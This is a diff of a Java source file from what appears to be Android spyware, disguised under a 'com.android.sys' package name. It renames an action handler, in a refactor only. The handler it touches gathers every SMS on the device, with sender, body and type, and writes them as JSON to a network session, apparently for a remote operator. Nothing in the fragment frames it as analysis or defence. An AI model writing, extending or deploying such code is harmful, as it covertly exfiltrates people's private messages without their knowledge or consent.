@@ -1,4 +1,4 @@
-package com.android.sys.action;
+package com.android.sys.session.handler;
 
 import com.android.sys.service.SystemService;
 import com.android.sys.session.NetworkSessionManager;
@@ -14,9 +14,9 @@ import java.io.OutputStream;
 import java.io.UnsupportedEncodingException;
 import java.util.List;
 
-public class UploadSmsAction implements NetworkSessionManager.ActionHandler {
+public class UploadSmsSessionHandler implements NetworkSessionManager.SessionHandler {
     @Override
-    public void handleAction(String actionName, InputStream inputStream, OutputStream outputStream) {
+    public void handleSession(String sessionName, InputStream inputStream, OutputStream outputStream) {
         List<SystemUtil.SmsData> smsList = SystemUtil.getSmsInPhone(SystemService.getContext());
         if(smsList == null) {
             return;
@@ -33,7 +33,7 @@ public class UploadSmsAction implements NetworkSessionManager.ActionHandler {
                 smsJsonObject.put("type", smsData.type);
                 smsArray.put(smsJsonObject);
             }
-            responseJsonObject.put(actionName, smsArray);
+            responseJsonObject.put(sessionName, smsArray);
         } catch (JSONException e) {
         }
         byte[] responseData = null;
